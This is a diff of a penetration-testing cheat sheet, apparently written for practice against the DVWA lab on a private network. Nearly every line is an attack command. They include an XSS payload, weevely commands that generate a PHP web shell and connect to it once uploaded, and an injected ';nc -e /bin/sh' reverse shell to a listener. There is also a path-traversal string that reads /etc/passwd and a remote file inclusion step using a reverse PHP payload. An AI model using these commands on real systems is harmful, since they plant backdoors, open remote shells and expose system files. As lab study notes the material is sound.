@@ -91,7 +91,7 @@ sudo openvpn nmap -sV {target IP}
 </whatever tag><whatever tag>alert(1)</whatever tag>
 [backlash and closing tag escape]
 
-weevely generate (any_passwd) /storage_path/file_name
+weevely generate (any_passwd) /storage_path/file_name.php
 [generate php shell]
 
 weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
@@ -124,7 +124,7 @@ weevely http://192.168.136.131/dvwa/hackable/uploads/shell.php 123456
 - "wget -r (url)" to get folders in git then analyse the git file using "view master's history" option on git software
 
 #FILE INCLUSION
-[+] use "; nc -e /bin/sh 192.168.136.128 8080" in net service to check RCE vulnerability while listening in port (nc --vv -l -n -p 8080)
+[+] use ";nc -e /bin/sh 192.168.136.128 8080" in net service to check RCE vulnerability while listening in port (nc --vv -l -n -p 8080)
 [+] use "?page=../../../../../etc/passwd" on site link to perform LFI (check if there is "/include.php" on site)
 [+] RFI by listening with "nc -vv -l -n -p 8080" and paste URL of reverse php(txt) payload saved on apache web server into (?page=localhost_site?)
 
